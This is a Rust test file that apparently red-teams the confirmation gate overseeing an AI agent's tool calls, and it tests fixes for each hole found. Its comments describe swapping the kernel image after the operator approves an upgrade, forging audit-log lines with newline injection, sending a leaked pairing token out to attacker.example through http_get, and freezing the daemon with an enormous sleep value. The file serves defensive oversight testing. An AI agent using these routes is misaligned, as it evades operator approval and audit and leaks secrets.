//! Round 3 (fi1 workstream D): attacks on the claim round 2 ended with.
//! See docs/research/fi1_reports/userland_round3.md.
//!
//! Tests named `r3_*` demonstrate a break and its fix: the ones that use
//! only APIs that existed at 7fec04e (`r3_1_*`, `r3_4_*`) fail against that
//! commit's daemon sources. Tests named `documents_*` assert behaviour that
//! is a policy question for the author; they pin today's behaviour so a
//! change is deliberate.

use heliox_gate_tests::cognitive::authority::{
    agent_audit_text, implicit_subject, paths_overlap, redact_file_secrets, redact_screen_secrets, subject_path,
    tool_tier, validate_tool_call, PermissionTier, Refusal, AGENT_AUDIT_PREFIX,
    KERNEL_UPGRADE_IMAGE, MAX_AUDIT_BYTES, TOOL_TIERS,
};
use heliox_gate_tests::cognitive::confirmation::{
    clear_for_execution, Clearance, ConfirmationGate,
};
use heliox_gate_tests::cognitive::json::JsonValue;
use heliox_gate_tests::{ORCHESTRATOR_SOURCE, TOOL_MAPPER_SOURCE};

fn s(v: &str) -> JsonValue {
    JsonValue::Str(v.to_string())
}

fn args(pairs: &[(&str, JsonValue)]) -> Vec<(String, JsonValue)> {
    pairs.iter().map(|(k, v)| (k.to_string(), v.clone())).collect()
}

fn awaiting_id(c: Clearance) -> u32 {
    match c {
        Clearance::Awaiting { id, .. } => id,
        other => panic!("expected Awaiting, got {:?}", other),
    }
}

// ---------------------------------------------------------------------------
// R3-1. An approved kernel upgrade outlived the image it was about.
// trigger_kernel_upgrade takes no arguments and kexecs whatever
// /disk/boot/kernel.bin holds when it runs (self_evolve.rs). Round 2's
// withdrawal rule only knew paths named in arguments, so with
// auto_approve_tier=3:
//   trigger_kernel_upgrade {}                  -> Awaiting (id=N); the operator
//                                                 checks the staged image, approves
//   write_file {path:"/disk/boot/kernel.bin",
//               content:<agent's image>}       -> runs unasked (Tier 3)
//   trigger_kernel_upgrade {}                  -> ran: kexec of the agent's image
// The operator was shown `trigger_kernel_upgrade (Destructive)` and nothing
// else. The kernel's own 'y' prompt for kexec does not say which image
// either. With the default tier the swap needs one write approval that does
// not mention the pending upgrade.
// ---------------------------------------------------------------------------

#[test]
fn r3_1_rewriting_the_kernel_image_withdraws_an_approved_upgrade() {
    let none: Vec<(String, JsonValue)> = Vec::new();
    for path in ["/disk/boot/kernel.bin", "//disk/boot//kernel.bin", "/disk/tmp/../boot/kernel.bin", "/disk/BOOT/kernel.bin"] {
        let mut gate = ConfirmationGate::new(600).with_file_versions(heliox_gate_tests::stable_versions).with_click_targets(heliox_gate_tests::stable_click_target).with_service_names(heliox_gate_tests::stable_service_names).with_focus_targets(heliox_gate_tests::stable_focus_target);
        let id = awaiting_id(clear_for_execution(&mut gate, "trigger_kernel_upgrade", &none, 3, 1));
        assert!(gate.approve(id));
        let w = args(&[("path", s(path)), ("content", s("\u{7f}ELF agent image"))]);
        assert_eq!(clear_for_execution(&mut gate, "write_file", &w, 3, 2), Clearance::Proceed);
        assert!(
            matches!(clear_for_execution(&mut gate, "trigger_kernel_upgrade", &none, 3, 3), Clearance::Awaiting { .. }),
            "approved upgrade survived a rewrite of {}",
            path
        );
    }
    // Deleting the boot directory withdraws it too.
    let mut gate = ConfirmationGate::new(600).with_file_versions(heliox_gate_tests::stable_versions).with_click_targets(heliox_gate_tests::stable_click_target).with_service_names(heliox_gate_tests::stable_service_names).with_focus_targets(heliox_gate_tests::stable_focus_target);
    let id = awaiting_id(clear_for_execution(&mut gate, "trigger_kernel_upgrade", &none, 3, 1));
    assert!(gate.approve(id));
    let d = args(&[("path", s("/disk/boot"))]);
    assert_eq!(clear_for_execution(&mut gate, "delete_file", &d, 4, 2), Clearance::Proceed);
    assert!(!gate.approve(id));
    // An unrelated write does not.
    let mut gate = ConfirmationGate::new(600).with_file_versions(heliox_gate_tests::stable_versions).with_click_targets(heliox_gate_tests::stable_click_target).with_service_names(heliox_gate_tests::stable_service_names).with_focus_targets(heliox_gate_tests::stable_focus_target);
    let id = awaiting_id(clear_for_execution(&mut gate, "trigger_kernel_upgrade", &none, 3, 1));
    assert!(gate.approve(id));
    let w = args(&[("path", s("/disk/boot/kernel.bin.bak")), ("content", s("x"))]);
    assert_eq!(clear_for_execution(&mut gate, "write_file", &w, 3, 2), Clearance::Proceed);
    assert_eq!(clear_for_execution(&mut gate, "trigger_kernel_upgrade", &none, 3, 3), Clearance::Proceed);
}

#[test]
fn r3_1_the_operator_is_told_which_file_an_upgrade_boots() {
    let mut gate = ConfirmationGate::new(600).with_file_versions(heliox_gate_tests::stable_versions).with_click_targets(heliox_gate_tests::stable_click_target).with_service_names(heliox_gate_tests::stable_service_names).with_focus_targets(heliox_gate_tests::stable_focus_target);
    match clear_for_execution(&mut gate, "trigger_kernel_upgrade", &[], 3, 1) {
        Clearance::Awaiting { display, full_display, .. } => {
            assert!(full_display.contains(KERNEL_UPGRADE_IMAGE), "{:?}", full_display);
            assert!(display.contains(KERNEL_UPGRADE_IMAGE), "{:?}", display);
        }
        other => panic!("{:?}", other),
    }
    assert_eq!(subject_path("trigger_kernel_upgrade", &[]).as_deref(), Some(KERNEL_UPGRADE_IMAGE));
}

// ---------------------------------------------------------------------------
// Revocation table: every tool x modified paths, against a specification
// written independently of authority.rs. A request is withdrawn exactly when
// the file it acts on (named in `path` for write/mkdir/delete/exec, fixed
// for trigger_kernel_upgrade) overlaps the modified path.
// ---------------------------------------------------------------------------

fn spec_subject(tool: &str, a: &[(String, JsonValue)]) -> Option<String> {
    if tool == "trigger_kernel_upgrade" {
        return Some(String::from("/disk/boot/kernel.bin"));
    }
    if !["write_file", "create_directory", "delete_file", "exec_process"].contains(&tool) {
        return None;
    }
    let p = a.iter().find(|(k, _)| k == "path").and_then(|(_, v)| match v {
        JsonValue::Str(s) => Some(s.clone()),
        _ => None,
    })?;
    let mut parts: Vec<String> = Vec::new();
    for c in p.trim().split('/') {
        match c {
            "" | "." => {}
            ".." => {
                parts.pop();
            }
            c => parts.push(c.to_ascii_lowercase()),
        }
    }
    Some(format!("/{}", parts.join("/")))
}

fn spec_overlap(a: &str, b: &str) -> bool {
    let under = |c: &str, p: &str| c == p || p == "/" || c.starts_with(&format!("{}/", p));
    under(a, b) || under(b, a)
}

#[test]
fn revocation_table_is_exhaustive_over_tools_and_modified_paths() {
    let request_args = args(&[("path", s("/disk/data/report.elf")), ("content", s("x"))]);
    let modified = ["/disk/data/report.elf", "/disk/data", "/disk/boot/kernel.bin", "/disk/boot", "/disk/other", "/"];
    let mut tools: Vec<&str> = TOOL_TIERS.iter().map(|(n, _)| *n).collect();
    tools.push("unknown_tool");
    let mut cells = 0;
    for tool in &tools {
        if tool_tier(tool) == PermissionTier::Observe {
            continue; // never queued
        }
        for m in modified {
            let mut gate = ConfirmationGate::new(600).with_file_versions(heliox_gate_tests::stable_versions).with_click_targets(heliox_gate_tests::stable_click_target).with_service_names(heliox_gate_tests::stable_service_names).with_focus_targets(heliox_gate_tests::stable_focus_target);
            let id = awaiting_id(clear_for_execution(&mut gate, tool, &request_args, 0, 1));
            assert!(gate.approve(id));
            let w = args(&[("path", s(m)), ("content", s("y"))]);
            // The modifying write runs at tier 3 (auto) and does not touch the
            // request's own fingerprint unless the tool is write_file itself.
            let write_cleared = clear_for_execution(&mut gate, "write_file", &w, 3, 2);
            assert_eq!(write_cleared, Clearance::Proceed);
            let want_withdrawn = spec_subject(tool, &request_args)
                .map(|subject| spec_overlap(&subject, &spec_subject("write_file", &w).unwrap()))
                .unwrap_or(false);
            let got = clear_for_execution(&mut gate, tool, &request_args, 0, 3);
            if want_withdrawn {
                assert!(matches!(got, Clearance::Awaiting { .. }), "{} not withdrawn by write {}", tool, m);
            } else {
                assert_eq!(got, Clearance::Proceed, "{} withdrawn by write {}", tool, m);
            }
            cells += 1;
        }
    }
    let queued = tools.iter().filter(|t| tool_tier(t) != PermissionTier::Observe).count();
    assert_eq!(cells, queued * modified.len());
    // The implementation's own helpers agree with the specification.
    assert!(paths_overlap("/disk/boot/kernel.bin", "/disk/boot"));
    assert_eq!(implicit_subject("exec_process"), None);
}

// ---------------------------------------------------------------------------
// R3-2. The agent could forge and flood the audit trail. audit_write
// (Tier 1) and report_status (Tier 1) passed model text straight to the
// kernel audit log, which prints `[AUDIT] Event: message` on serial and
// stores `[tick] Event: message` lines in /disk/heliox/audit.log. A message
// with a line break forged further entries, for example
//   audit_write {message:"ok\n[AUDIT] PermissionDenied: ...\n[1234] UserAudit: neural: session disarmed"}
// and an agent entry "neural: session disarmed" was indistinguishable from
// the daemon's own neural audit events. Now every agent entry is one line
// of printable ASCII starting with "agent-audit: " (or "HELIOX_STATUS:").
// The kernel ring keeps 256 entries; the agent can still push older,
// unflushed entries out (kernel quota, workstream C; see the report).
// ---------------------------------------------------------------------------

#[test]
fn r3_2_agent_audit_text_is_one_marked_line_within_the_kernel_bound() {
    let forged = "ok\n[AUDIT] PermissionDenied: x\r\n[1234] UserAudit: neural: session disarmed\u{202e}";
    let entry = agent_audit_text(AGENT_AUDIT_PREFIX, forged);
    assert!(entry.starts_with("agent-audit: "), "{}", entry);
    assert!(entry.bytes().all(|b| (0x20..=0x7e).contains(&b)), "{:?}", entry);
    assert!(entry.contains("\\n[AUDIT]"));
    // Long messages are cut and marked, never rejected by the kernel bound.
    let long = agent_audit_text(AGENT_AUDIT_PREFIX, &"\n".repeat(5000));
    assert!(long.len() <= MAX_AUDIT_BYTES && long.ends_with("...[truncated]"), "{}", long.len());
    let exact = agent_audit_text("HELIOX_STATUS:", &"a".repeat(MAX_AUDIT_BYTES - "HELIOX_STATUS:".len()));
    assert_eq!(exact.len(), MAX_AUDIT_BYTES);
    assert!(!exact.ends_with("[truncated]"));
    // The executors use it.
    assert!(TOOL_MAPPER_SOURCE.contains("agent_audit_text(super::authority::AGENT_AUDIT_PREFIX, &message)"));
    assert!(TOOL_MAPPER_SOURCE.contains("agent_audit_text(\"HELIOX_STATUS:\", &status)"));
    assert!(!TOOL_MAPPER_SOURCE.contains("format!(\"HELIOX_STATUS:{}\", status)"));
}

// ---------------------------------------------------------------------------
// R3-3. The bridge pairing secret reached the model. main.rs prints
// "[heliox-daemon] bridge pairing token: <32 hex>" on the console so the
// physical operator can pair a bridge client. observe() puts the last 4 KB
// of the screen into every prompt, and read_screen (Tier 1) returns it, so
// the model (and the cloud provider) received the secret, and
//   http_get {host:"attacker.example", path:"/t?<token>"}   (Tier 2, auto at the default tier)
// handed it to anyone who can reach port 8785. Now the screen text the agent
// sees has the token replaced.
// ---------------------------------------------------------------------------

#[test]
fn r3_3_the_pairing_secret_is_redacted_from_screen_text() {
    let token = "0123456789abcdef0123456789abcdef";
    let screen = format!("boot ok\n[heliox-daemon] bridge pairing token: {}\n$ ", token);
    let seen = redact_screen_secrets(&screen);
    assert!(!seen.contains(token), "{}", seen);
    assert!(seen.contains("bridge pairing token: [redacted]"));
    assert!(seen.starts_with("boot ok\n") && seen.ends_with("\n$ "));
    // Wrapped across two console rows.
    let wrapped = "xx [heliox-daemon] bridge pairing token: 0123456789abcdef01\n23456789abcdef rest";
    let seen = redact_screen_secrets(wrapped);
    assert!(!seen.contains("0123456789abcdef01") && !seen.contains("23456789abcdef"), "{}", seen);
    assert!(seen.ends_with(" rest"), "{}", seen);
    // Other text is untouched.
    assert_eq!(redact_screen_secrets("a\nb\n\nc"), "a\nb\n\nc");
    // Both places the screen reaches the model use it.
    assert!(TOOL_MAPPER_SOURCE.contains("redact_screen_secrets(&capture.full_text())"));
    assert!(ORCHESTRATOR_SOURCE.contains("redact_screen_secrets(&capture.full_text())"));
}

#[test]
fn r3_3_the_provider_api_key_is_redacted_from_the_daemons_config() {
    let config = r#"{ "provider": "claude", "api_host": "api.anthropic.com", "api_port": 443, "api_key": "sk-ant-SECRET\"x", "model_name": "m" }"#;
    for path in ["/disk/heliox/config.json", "//disk/heliox//config.json", "/disk/heliox/config.json/"] {
        let seen = redact_file_secrets(path, config);
        assert!(!seen.contains("SECRET"), "{}", seen);
        assert!(seen.contains(r#""api_key": "[redacted]", "model_name": "m" }"#), "{}", seen);
    }
    // Every occurrence, truncated values, non-string values.
    let two = r#"{"api_key":"a1","x":{"api_key" : "b2"}}"#;
    let seen = redact_file_secrets("/disk/heliox/config.json", two);
    assert!(!seen.contains("a1") && !seen.contains("b2"), "{}", seen);
    let cut = r#"{"provider":"openai","api_key":"sk-abc"#;
    assert!(!redact_file_secrets("/disk/heliox/config.json", cut).contains("sk-abc"));
    let number = r#"{"api_key": 12345, "p": 1}"#;
    assert!(!redact_file_secrets("/disk/heliox/config.json", number).contains("12345"));
    // Other files are returned unchanged.
    assert_eq!(redact_file_secrets("/disk/notes/api.json", config), config);
    assert!(TOOL_MAPPER_SOURCE.contains("redact_file_secrets(&path, content)"));
}

// ---------------------------------------------------------------------------
// R3-4. A Tier-1 tool froze the daemon. sleep {ms:1e300} saturates to
// u64::MAX milliseconds and the kernel's sleep has no upper bound, so the
// daemon stops: the control mailbox is not polled (CONFIRM, GOAL,
// NEURAL_DISARM are not applied), the bridge is not served and pending
// requests never expire. Now `ms` must be a number from 0 to 10 000.
// ---------------------------------------------------------------------------

#[test]
fn r3_4_sleep_cannot_freeze_the_daemon() {
    for bad in [JsonValue::Number(1e300), JsonValue::Number(10_001.0), JsonValue::Number(-5.0), s("1e300"), JsonValue::Null] {
        let a = args(&[("ms", bad.clone())]);
        assert!(validate_tool_call("sleep", &a).is_err(), "{:?}", bad);
    }
    assert_eq!(validate_tool_call("sleep", &args(&[("ms", JsonValue::Number(1e300))])), Err(Refusal::SleepOutOfRange));
    for ok in [0.0, 25.0, 10_000.0] {
        assert_eq!(validate_tool_call("sleep", &args(&[("ms", JsonValue::Number(ok))])), Ok(()));
    }
    assert_eq!(validate_tool_call("sleep", &[]), Ok(()));
}

// Policy questions Q1 and Q2 were decided in fi2: their documenting tests
// are replaced by the tests in policy_fi2.rs, which assert the new behaviour.

// ---------------------------------------------------------------------------
// Documented: a denial is final for that request only. The same call
// proposed again after the denial was consumed is a new request with a new
// id (the agent can ask again; it cannot turn the denial into an approval).
// ---------------------------------------------------------------------------

#[test]
fn documents_a_denied_call_can_be_asked_again_under_a_new_id() {
    let mut gate = ConfirmationGate::new(600).with_file_versions(heliox_gate_tests::stable_versions).with_click_targets(heliox_gate_tests::stable_click_target).with_service_names(heliox_gate_tests::stable_service_names).with_focus_targets(heliox_gate_tests::stable_focus_target);
    let a = args(&[("path", s("/disk/x"))]);
    let first = awaiting_id(clear_for_execution(&mut gate, "delete_file", &a, 2, 1));
    assert!(gate.deny(first));
    assert!(!gate.approve(first));
    assert_eq!(clear_for_execution(&mut gate, "delete_file", &a, 2, 2), Clearance::Denied);
    let second = awaiting_id(clear_for_execution(&mut gate, "delete_file", &a, 2, 3));
    assert_ne!(first, second);
}
